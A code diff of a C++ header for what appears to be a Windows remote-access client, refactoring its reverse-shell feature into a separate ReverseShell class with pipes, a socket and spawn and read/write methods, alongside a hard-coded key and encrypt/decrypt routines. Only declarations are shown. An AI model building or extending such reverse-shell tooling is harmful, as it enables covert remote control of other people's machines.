@@ -3,6 +3,8 @@
 #ifndef _CLIENTE_H
 #define _CLIENTE_H
 
+class ReverseShell;
+
 
 class Cliente {
 	private:
@@ -11,6 +13,8 @@ class Cliente {
 								  0X33, 0X37, 0X7D, 0X2E, 0X7E, 0X40, 0X69, 0X6C, 0X65, 0X72, 0X61, 0x25, 0x25, 0x5D, 0x72, 0x5E };
 		ByteArray bKey;
 		void Init_Key();
+
+		ReverseShell* reverseSHELL;
 	public:
 		Cliente();
 		~Cliente();
@@ -28,9 +32,9 @@ class Cliente {
 		int cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock = false);
 
 		//Reverse shell
-		void SpawnShell(const std::string strComando);
-		void thLeerShell(HANDLE hPipe);
-		void thEscribirShell(HANDLE hPipe);
+		//void SpawnShell(const std::string strComando);
+		//void thLeerShell(HANDLE hPipe);
+		//void thEscribirShell(HANDLE hPipe);
 
 		ByteArray bDec(const unsigned char* pInput, size_t pLen);
 		ByteArray bEnc(const unsigned char* pInput, size_t pLen);
@@ -40,6 +44,29 @@ class Cliente {
 		void MainLoop();
 
 		void ProcesarComando(std::vector<std::string> strIn);
+
+};
+
+class ReverseShell {
+private:
+	Cliente* copy_ptr;
+	std::mutex mutex_shell;
+	bool isRunning = false;
+	PROCESS_INFORMATION pi;
+	HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
+	std::thread tRead;
+public:
+	ReverseShell(Cliente* nFather) : copy_ptr(nFather) {}
+	SOCKET sckSocket;
+	bool SpawnShell(const char* pStrComando);
+	void TerminarShell();
+
+	void thEscribirShell(std::string pStrInput);
+	void thLeerShell(HANDLE hPipe);
+
+
+
+
 
 };
 
